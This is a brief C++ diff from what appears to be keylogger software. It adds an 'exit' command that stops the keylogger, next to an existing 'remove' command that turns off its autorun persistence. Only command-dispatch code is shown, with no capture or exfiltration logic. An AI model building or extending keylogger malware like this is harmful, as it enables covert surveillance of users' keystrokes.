@@ -101,6 +101,11 @@ command_t commandDefs[] = {
 			"remove", [](std::vector<std::string> args) {
 				keylogger.SetAutorun(false);
 			}
+		},
+		{
+			"exit", [](std::vector<std::string> args) {
+				keylogger.Stop();
+			}
 		}
 };
 
